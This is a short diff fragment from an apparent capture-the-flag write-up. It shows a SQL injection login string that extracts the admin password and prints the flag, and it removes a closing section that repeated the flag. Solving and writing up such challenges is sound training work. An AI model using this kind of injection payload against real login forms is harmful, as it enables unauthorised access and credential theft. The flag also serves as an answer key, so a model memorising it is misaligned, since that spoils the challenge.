@@ -27,7 +27,3 @@ Login with `' union select (SELECT password FROM user WHERE user='admin'),2--`. 
 ```
 You are MMA{cats_alice_band} user.
 ```
-
-## Flag
-
-MMA{cats_alice_band}
